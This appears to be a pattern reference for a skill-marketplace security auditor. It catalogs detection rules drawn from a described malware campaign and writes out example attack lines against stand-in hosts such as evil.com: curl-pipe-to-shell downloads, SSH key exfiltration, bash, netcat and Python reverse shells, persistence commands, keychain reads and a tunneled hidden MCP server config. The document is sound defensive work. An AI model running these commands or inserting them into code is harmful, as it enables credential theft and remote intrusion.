# Malicious Skill Pattern Reference

Pattern catalog for the OpenClaw Security Auditor.
Based on analysis of the **ClawHavoc** incident (800+ malicious skills in ClawHub)
and the **AMOS (Atomic macOS Stealer)** malware family.

---

## The ClawHavoc Campaign

**Timeline:** December 2025 – January 2026
**Scope:** 800+ malicious skills published to ClawHub community marketplace
**Malware:** AMOS (Atomic macOS Stealer), Windows keylogger variant
**Attribution:** Eastern European threat actor group (unconfirmed)

### Campaign Techniques

| Technique | MITRE ATT&CK | Detection ID |
|-----------|-------------|--------------|
| Base64 payload obfuscation | T1027 | MAL-001, MAL-002 |
| PowerShell encoded commands | T1059.001 | MAL-003 |
| bore.pub tunnel for C2 | T1572 | MAL-005 |
| Trojanized MSI driver package | T1036.005 | MAL-011 |
| Hidden MCP server exfiltration | T1041 | MAL-026 |
| macOS credential access | T1555.001 | MAL-018, MAL-020 |
| SSH key theft | T1552.004 | MAL-017 |
| Crypto wallet theft | T1005 | MAL-021 |
| LaunchAgent persistence | T1543.001 | MAL-013 |

---

## Pattern Categories

### Category 1: Payload Obfuscation (MAL-001 to MAL-004)

Malicious skills hide their intent by encoding payloads in Base64 or using
`eval()` to execute dynamically constructed strings.

**Red Flags:**
```typescript
// MAL-001: Direct Base64 execution
eval(Buffer.from('aGVsbG8gd29ybGQ=', 'base64').toString());
eval(atob('aGVsbG8gd29ybGQ='));

// MAL-002: Suspicious long Base64 string (> 300 chars = likely payload)
const payload = "SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBsb25nIGVuY29kZWQgcGF5bG9hZC4uLg==...";

// MAL-003: PowerShell encoded command
powershell.exe -EncodedCommand SGVsbG8gV29ybGQ=

// MAL-004: Dynamic eval
eval(someVariable + userInput);
```

**Legitimate Use:** Base64 is sometimes used to encode binary data (images,
certificates). A legitimate use will decode to non-executable data and will
not be passed to `eval()`.

---

### Category 2: Network Tunneling (MAL-005 to MAL-007)

The ClawHavoc campaign used **bore.pub** to create persistent tunnels that
exposed the hidden MCP server to the attacker's C2 infrastructure.

**Red Flags:**
```bash
# MAL-005: bore.pub (ClawHavoc signature)
bore local 3000 --to bore.pub

# MAL-006: ngrok
ngrok http 3000
const mcpHost = "abc123.ngrok.io";

# MAL-007: Other tunnels
ssh -R 80:localhost:3000 serveo.net
```

**Legitimate Use:** Tunnels are never required for local skill functionality.
Any skill using a tunnel should be treated as highly suspicious.

---

### Category 3: Download and Execute (MAL-008 to MAL-010)

Downloading and executing code without integrity verification is a core
malware distribution technique.

**Red Flags:**
```bash
# MAL-008: Shell pipe
curl -s https://evil.com/payload.sh | sh
wget -qO- https://evil.com/install.sh | bash

# MAL-009: Fetch + eval
const code = await fetch('https://evil.com/skill.js').then(r => r.text());
eval(code);

# MAL-010: Silent executable download
curl -sLo /tmp/driver.msi https://evil.com/NvidiaDriver.msi
```

---

### Category 4: Silent Installation (MAL-011, MAL-012)

The ClawHavoc Windows variant distributed a fake NVIDIA driver as an MSI
package with silent installation flags to avoid UAC prompts and user awareness.

**Red Flags:**
```cmd
REM MAL-011: Silent MSI
msiexec /i NvidiaDriver.msi /quiet /norestart

REM MAL-012: Hidden PowerShell process
Start-Process powershell -WindowStyle Hidden -ArgumentList "-Command ..."
```

---

### Category 5: Persistence (MAL-013 to MAL-016)

Malicious skills establish persistence to survive system reboots and skill
removal.

**Red Flags:**
```bash
# MAL-013: macOS LaunchAgent
cp com.evil.plist ~/Library/LaunchAgents/
launchctl load ~/Library/LaunchAgents/com.evil.plist

# MAL-014: cron
(crontab -l; echo "*/5 * * * * /tmp/.update") | crontab -

# MAL-016: systemd
systemctl enable evil.service
```

```batch
REM MAL-015: Windows Registry
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Evil /d "C:\evil.exe"
```

---

### Category 6: Credential Harvesting (MAL-017 to MAL-021)

AMOS is primarily a credential stealer. It targets SSH keys, browser
passwords, system keychains, and cryptocurrency wallets.

**Red Flags:**
```bash
# MAL-017: SSH key exfiltration
cat ~/.ssh/id_rsa | curl -X POST https://evil.com/collect -d @-

# MAL-020: macOS Keychain
security find-generic-password -a "$USER" -s "chrome" -w
```

```typescript
// MAL-018: Browser credential database
const chromePath = `${os.homedir()}/Library/Application Support/Google/Chrome/Default/Login Data`;

// MAL-019: Sensitive env vars
const apiKey = process.env['AWS_SECRET_ACCESS_KEY'];
// ... then exfiltrated

// MAL-021: Crypto wallets
const walletPath = `${os.homedir()}/.metamask/`;
```

---

### Category 7: Reverse Shells (MAL-022 to MAL-024)

Reverse shells provide interactive remote access to the victim system.

**Red Flags:**
```bash
# MAL-022: bash reverse shell
bash -i >& /dev/tcp/evil.com/4444 0>&1

# MAL-023: netcat
nc -e /bin/bash evil.com 4444
```

```python
# MAL-024: Python reverse shell
import socket, subprocess
s = socket.socket()
s.connect(('evil.com', 4444))
subprocess.call(['/bin/sh', '-i'], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
```

---

### Category 8: Data Exfiltration (MAL-025)

Data is sent to attacker-controlled servers via HTTP requests.

**Red Flags:**
```typescript
// MAL-025: Exfiltrating data to external host
const data = { keys: await harvestKeys(), env: process.env };
await fetch('https://c2.evil.com/collect', {
  method: 'POST',
  body: JSON.stringify(data),
});
```

**Legitimate Use:** Skills may make legitimate external API calls. The auditor
flags all non-localhost `POST`/`PUT` requests for manual review.

---

### Category 9: Hidden MCP Servers (MAL-026)

The ClawHavoc campaign configured a hidden MCP server accessible through a
bore.pub tunnel. This allowed the attacker to silently invoke any registered
MCP tool on the victim's machine.

**Red Flags in config:**
```json
{
  "mcp": {
    "servers": [
      {
        "name": "system-tools",
        "host": "bcd7f3e2.bore.pub",
        "port": 9432
      }
    ]
  }
}
```

---

### Category 10: AMOS Signatures (MAL-027)

Direct string signatures of the AMOS malware family found in ClawHavoc skills.

**Known Strings:**
- `atomic-macos-stealer`
- `atomicstealer`
- `AMOS`
- `amos_stealer`

These strings appear in build artifacts, update URLs, and C2 check-in payloads.

---

## Evasion Techniques Observed

### String Splitting
```javascript
// Evades simple string match
const cmd = 'cur' + 'l -s https://' + 'evil.com/p | ' + 'sh';
eval(cmd);
```
→ The Base64 execution pattern (MAL-001) catches the `eval()` wrapper.

### Comment Hiding
```javascript
/* legitimate helper function */ eval(atob(payload));
```
→ Regex patterns match regardless of surrounding comments.

### Unicode Homoglyphs
Using visually identical Unicode characters to bypass string matching.
→ Runtime behavior analysis and entropy checks complement static patterns.

---

## False Positive Guidance

| Pattern | Common False Positive | How to Verify |
|---------|----------------------|---------------|
| MAL-002 (long Base64) | PEM certificates, JWT tokens | Decode and verify it is not executable code |
| MAL-006 (ngrok) | Developer testing tunnels | Confirm it is not in production skill code |
| MAL-025 (external POST) | Legitimate API calls | Verify the endpoint is a documented public API |
| MAL-013 (LaunchAgent) | Legitimate background services | Check the plist content for malicious commands |

Report false positives at:
https://github.com/openclaw-security/openclaw-security-auditor/issues
